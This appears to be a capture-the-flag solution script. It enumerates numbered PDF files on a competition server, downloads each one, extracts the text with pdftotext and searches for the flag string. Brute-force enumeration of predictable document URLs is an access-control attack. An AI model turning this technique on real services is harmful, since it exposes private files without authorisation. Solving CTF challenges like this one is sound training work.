#!/usr/bin/env python3
import os
import re
import requests as req
import codecs

dir_out = './downloaded_files'
if not os.path.exists(dir_out):
    os.mkdir(dir_out)

flag_regex = r'flag{.*}'

for i in range(300):
    res = req.get("http://hackfest.redrocket.club:31000/docs/document_{:03d}.pdf".format(i))
    if res.status_code == 200:
        print('[+] Downloading document_{:03d}.pdf'.format(i))
        open('{}/document_{:03d}.pdf'.format(dir_out, i), 'wb').write(res.content)
        os.system('pdftotext {}/document_{:03d}.pdf'.format(dir_out, i))
        with codecs.open('{}/document_{:03d}.txt'.format(dir_out, i), 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            if re.search(flag_regex, content):
                print("\n[i] " + re.findall(flag_regex, content)[0])
                exit()
print("[!] Error 404 - flag not found")

